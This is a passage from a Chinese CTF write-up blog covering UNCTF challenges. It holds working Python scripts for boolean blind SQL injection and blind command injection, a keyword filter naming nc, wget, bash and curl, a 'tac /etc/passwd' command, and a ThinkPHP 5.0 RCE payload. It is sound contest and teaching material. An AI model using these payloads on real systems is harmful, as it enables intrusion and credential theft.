class="variable">$ans</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>: <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>: <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;3&quot;</span>: <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;4&quot;</span>: <span class="keyword">return</span> <span class="string">&quot;D&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$studentid</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where studentid=&#x27;<span class="subst">$studentid</span>&#x27;;&quot;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">                        <span class="variable">$username</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                        <span class="variable">$sql</span> = <span class="string">&quot;select * from score where username=&#x27;<span class="subst">$username</span>&#x27;;&quot;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$result2</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">                            <span class="variable">$row2</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>()-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                                &lt;div class=&#x27;get-flag&#x27;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;div align=&#x27;cent&#x27;&gt;</span></span><br><span class="line"><span class="string">                                        &lt;div align=&#x27;center&#x27;&gt;</span></span><br><span class="line"><span class="string">                                            &lt;h1&gt;姓名：&quot;</span>.<span class="variable">$row2</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                                        &lt;div align=&#x27;center&#x27;&gt;</span></span><br><span class="line"><span class="string">                                            恭喜你获得了：&lt;h2&gt;&quot;</span>.<span class="variable">$row2</span>[<span class="string">&quot;score&quot;</span>].<span class="string">&quot;分&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                                &lt;/div&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                                &quot;</span>;</span><br><span class="line">                            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">get</span>-<span class="title">fl4g</span>&quot;&gt;<span class="title">Ki1ro</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            <span class="title">if</span> ($<span class="title">result</span> = $<span class="title">mysqli</span>-&gt;<span class="title">query</span>(&quot;<span class="title">SELECT</span></span></span><br><span class="line"><span class="class">                    <span class="title">type</span>,<span class="title">Title</span>,<span class="title">TitleImg</span>,<span class="title">OptionA</span>,<span class="title">OptionB</span>,<span class="title">OptionC</span>,<span class="title">OptionD</span>,<span class="title">Answer</span></span></span><br><span class="line"><span class="class">                <span class="title">FROM</span></span></span><br><span class="line"><span class="class">                    <span class="title">challengesAll</span>,<span class="title">randChallenges</span> </span></span><br><span class="line"><span class="class">                <span class="title">WHERE</span></span></span><br><span class="line"><span class="class">                    <span class="title">randChallenges</span>.<span class="title">username</span> = &#x27;&quot;.<span class="title">addslashes_deep</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]).&quot;&#x27;</span></span><br><span class="line"><span class="class">                    <span class="title">AND</span> (<span class="title">challengesAll</span>.<span class="title">id</span> = <span class="title">randChallenges</span>.<span class="title">challengeId1</span> </span></span><br><span class="line"><span class="class">                    <span class="title">OR</span> <span class="title">challengesAll</span>.<span class="title">id</span> = <span class="title">randChallenges</span>.<span class="title">challengeId2</span> </span></span><br><span class="line"><span class="class">                    <span class="title">OR</span> <span class="title">challengesAll</span>.<span class="title">id</span> = <span class="title">randChallenges</span>.<span class="title">challengeId3</span> </span></span><br><span class="line"><span class="class">                    <span class="title">OR</span> <span class="title">challengesAll</span>.<span class="title">id</span> = <span class="title">randChallenges</span>.<span class="title">challengeId4</span> </span></span><br><span class="line"><span class="class">                    <span class="title">OR</span> <span class="title">challengesAll</span>.<span class="title">id</span> = <span class="title">randChallenges</span>.<span class="title">challengeId5</span>) </span></span><br><span class="line"><span class="class">                &quot;)) </span>&#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows == <span class="number">5</span>) &#123;</span><br><span class="line">                                    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line"></span><br><span class="line">                                    <span class="variable">$result2</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select ans1,ans2,ans3,ans4,ans5 from userAnswer where studentid=&#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;studentid&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                                    <span class="variable">$row2</span> = <span class="variable">$result2</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$row</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">0</span>]==<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                                            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;</span></span><br><span class="line"><span class="string">                    &#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            A、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">3</span>].<span class="string">&#x27;&lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            B、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">4</span>].<span class="string">&#x27;&lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            C、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">5</span>].<span class="string">&#x27;&lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            D、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">6</span>].<span class="string">&#x27;&lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;h3 align=&quot;centre&quot;&gt;正确答案：&#x27;</span>.<span class="title function_ invoke__">getAns</span>(<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">7</span>], <span class="string">&#x27;1&#x27;</span>).<span class="string">&#x27;   您的答案：&#x27;</span>.<span class="title function_ invoke__">getAns</span>(<span class="variable">$row2</span>[<span class="number">0</span>][<span class="variable">$i</span>], <span class="string">&#x27;1&#x27;</span>).<span class="string">&#x27;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;&#x27;</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">exit</span>(<span class="string">&quot;&lt;br&gt;未查询到成绩.&lt;/br&gt;学号或姓名可能有误&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">exit</span>(<span class="string">&quot;&lt;br&gt;未查询到成绩.&lt;/br&gt;学号或姓名可能有误&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>:<span class="meta">?&gt;</span></span><br><span class="line">        &lt;h1&gt;只有admin可以查询特定学号的成绩&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">        &lt;a href=<span class="string">&#x27;index.php&#x27;</span>&gt;返回主页&lt;/a&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span>  <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这边文件很多，但是无所谓，我会审计（<br>重点放在register和index文件内：<br>首先自定义了一个deep_addslansh函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567639488-0fe760c9-1ca5-42fa-b916-569e5daf40aa.png#averageHue=%23313943&clientId=u92cace27-3367-4&from=paste&height=122&id=u441c5c01&name=image.png&originHeight=152&originWidth=813&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13960&status=done&style=none&taskId=u0d4a1ca1-1072-406d-8160-7ef12ccca60&title=&width=650.4" alt="image.png"><br>让我们无懈可击，单引号和数组都无了<br>但是且看index这里：<br> <img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668567829910-eb781868-71e2-45f8-ba20-61955213721c.png#averageHue=%23323c47&clientId=u92cace27-3367-4&from=paste&height=83&id=ud310322e&name=image.png&originHeight=104&originWidth=736&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21259&status=done&style=none&taskId=u644adeaa-fb49-4322-a1a6-98efd272b9e&title=&width=588.8" alt="image.png"><br>这边的session[Name]是否没经过说明过滤处理？那不就行了！<br>写个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#AUthor：Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">url1=<span class="string">&quot;http://85d3435c-c201-4486-8984-6ff5099b7079.node.yuzhian.com.cn/register.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://85d3435c-c201-4486-8984-6ff5099b7079.node.yuzhian.com.cn/login.php&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">4000000</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;1&#x27; or username=if(ascii(substr((select group_concat(id,username,studentid) from users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,&#x27;a&#x27;,&#x27;1&#x27;)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;studentid&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;提交&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r1=requests.post(url=url1,data=data)</span><br><span class="line">        <span class="comment"># print(r1.text)</span></span><br><span class="line">        r2 = requests.post(url=url2, data=data)</span><br><span class="line">        <span class="comment"># print(r2.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;您已完成考试&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>用这个脚本之前，先注册一个用户为a,学号为1的用户，这样只要我们判断成立，完成考试就会出现，存在布尔盲注<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568039240-182a6999-6cf4-42da-a9e3-53701b061540.png#averageHue=%23363331&clientId=u92cace27-3367-4&from=paste&height=33&id=u278459af&name=image.png&originHeight=41&originWidth=210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3587&status=done&style=none&taskId=u2781e1c7-e374-47ec-8fe0-e22b03e916a&title=&width=168" alt="image.png"><br>可以看到admin和他的密码，登录一波：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568063786-d16362f3-b1c2-4c50-ad6e-1aaf6c8add25.png#averageHue=%23edeceb&clientId=u92cace27-3367-4&from=paste&height=151&id=u25fae214&name=image.png&originHeight=189&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22487&status=done&style=none&taskId=ud3dc63c3-475d-430e-ab8a-87140ed9ed4&title=&width=676.8" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568068024-e85e86e8-8dd6-4e1b-9096-30eb1ad843e5.png#averageHue=%23fcfcfc&clientId=u92cace27-3367-4&from=paste&height=423&id=u8b5f12f3&name=image.png&originHeight=529&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20429&status=done&style=none&taskId=u676fe22a-83ae-491d-9a42-882b3674a67&title=&width=926.4" alt="image.png"><br>直接搜索1就出来，这是在index.php做的处理</p>
<h2 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h2><p>这题不错，考了个比较新的，rce的布尔盲注，做的很少</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/\@|\#|\%|:|&amp;|;|\\\\|&quot;|\&#x27;|`|\.|\&amp;|\*|&gt;|&lt;|nc|wget|bash|sh|netcat|grep|base64|rev|curl|wget|php|ping|cat|fl|mkdir/i&#x27;</span>,$code))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exec</span>($code,$output,$return_val);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$return_val)   echo <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;fail&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">                    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;小黑子,露出只因脚了吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这边exec函数是没有回显的，只会告诉你执行成功与否，比如：<br><code>tac /etc/passwd</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568162708-645109ee-ef3b-416f-b702-855a89c63c9e.png#averageHue=%23f5e8c7&clientId=u92cace27-3367-4&from=paste&height=123&id=u68bfeffe&name=image.png&originHeight=154&originWidth=1095&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13595&status=done&style=none&taskId=u052621c5-14b1-4be1-afac-e88979b4333&title=&width=876" alt="image.png"><br>然后假如我们这样输入：<code>l$(tac /f??? | cut -b 1 | tr U s)</code><br>如果第一个字母为U,那就是ls指令，理论上会返回success，如果不是U就识别不出ls指令，就返回fail：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568280109-30e0b0bc-e120-4945-ace0-bedbbdf690b5.png#averageHue=%23fcfce9&clientId=u92cace27-3367-4&from=paste&height=82&id=u7be9e587&name=image.png&originHeight=102&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14570&status=done&style=none&taskId=u2152493c-7dd7-45de-8d9b-2650d2dd35c&title=&width=1003.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568290184-a18eb52d-93b9-4443-b2bf-9588a43fc406.png#averageHue=%23f5eacb&clientId=u92cace27-3367-4&from=paste&height=74&id=u9a665c57&name=image.png&originHeight=93&originWidth=1148&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12724&status=done&style=none&taskId=u18f7bcb2-d382-422e-89cb-5a2291b0ad5&title=&width=918.4" alt="image.png"><br>接下来也是一样的，根据他这个来写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author：Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line">url=<span class="string">&#x27;http://8227337a-705d-43cd-bc54-d3649f78c364.node.yuzhian.com.cn/&#x27;</span></span><br><span class="line"><span class="built_in">dict</span>=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzUNCTF1234567890&#123;&#125;-&#x27;</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">&quot;code&quot;</span>:<span class="string">f&quot;l$(tac /f??? | cut -b <span class="subst">&#123;count&#125;</span> | tr <span class="subst">&#123;i&#125;</span> s)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(payload[&#x27;code&#x27;])</span></span><br><span class="line">        <span class="comment"># t1=time.time()</span></span><br><span class="line">        r=requests.get(url=url,params=payload)</span><br><span class="line">        <span class="comment"># t2=time.time()</span></span><br><span class="line">        <span class="comment"># print(t2-t1)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result+=i</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>最后就出来了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568441056-28dd2d91-b438-4e7a-b71b-5117f917bf1e.png#averageHue=%2332302f&clientId=u92cace27-3367-4&from=paste&height=61&id=ub69ee22e&name=image.png&originHeight=76&originWidth=542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11271&status=done&style=none&taskId=uc741bd44-4065-4392-853b-9713ae8f2da&title=&width=433.6" alt="image.png"></p>
<h2 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h2><p>ThinkPHP5.0：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568789198-4c07121e-21a6-4da0-964c-ea142b3ec6f8.png#averageHue=%23f9f9f8&clientId=u92cace27-3367-4&from=paste&height=374&id=uff948ac9&name=image.png&originHeight=468&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34617&status=done&style=none&taskId=udc83b3e0-461c-4bc7-bd32-89f401b2aec&title=&width=645.6" alt="image.png"><br>乱杀啊<br>随便找个poc<code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568804712-af401e1e-c426-4d19-8229-606388531e09.png#averageHue=%23c2c1c1&clientId=u92cace27-3367-4&from=paste&height=495&id=u62cb0235&name=image.png&originHeight=619&originWidth=1367&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45806&status=done&style=none&taskId=u4ed82726-8f4a-4567-9d99-818cedb851b&title=&width=1093.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568847489-2e2e913a-aa0f-46f9-9907-c4602915f904.png#averageHue=%23b6b4b2&clientId=u92cace27-3367-4&from=paste&height=514&id=ue64e35e3&name=image.png&originHeight=642&originWidth=1331&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96026&status=done&style=none&taskId=ue9d97e58-251b-4dd0-a603-d8056f80948&title=&width=1064.8" alt="image.png"></p>
<h2 id="快乐三消"><a href="#快乐三消" class="headerlink" title="快乐三消"></a>快乐三消</h2><p>非预期解解出的，phpinfo界面，无语死</p>
<p><strong>预期解：</strong><br>扫目录会发现admin目录，然后也有git泄露：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668569551365-74977c8a-467d-4a19-808a-d9b146d047d2.png#averageHue=%23282c37&clientId=u92cace27-3367-4&from=paste&height=369&id=uc8cb3a6d&name=image.png&originHeight=461&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65642&status=done&style=none&taskId=u89a2856a-2514-418e-833c-61121d3b4db&title=&width=580.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668568918332-90a868da-7291-41bf-9efa-bb95b165feec.png#averageHue=%23faf9f9&clientId=u92cace27-3367-4&from=paste&height=446&id=u63584606&name=image.png&originHeight=558&originWidth=1111&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26944&status=done&style=none&taskId=ubc234d61-2640-4df4-81de-0b001d37f12&title=&width=888.8" alt="image.png"><br>然后就进不去了！感觉git给的东西没什么用啊！</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey-"></a>whereisyourkey-</h2><p>这个说实话就放在IDA里一搞就出：<br><code>121 101 115 105 97 109 102 108 97 103  yesiamflag </code><br>然后flag就是<code>flag&#123;yesiamflag&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">dict</span>=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;UNCTF&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    i=i.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(j.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()==i:</span><br><span class="line">            result+=j</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668570016140-64f75d5c-0224-474e-8b9a-6f27d385d056.png#averageHue=%2332302f&clientId=u92cace27-3367-4&from=paste&height=109&id=u4cd6fe1e&name=image.png&originHeight=136&originWidth=618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22471&status=done&style=none&taskId=ucfd26d23-16c2-47a4-a065-af40804cce9&title=&width=494.4" alt="image.png"></p>
<h2 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">dict</span>=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;UNCTF&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;out2.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">    i=i.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span 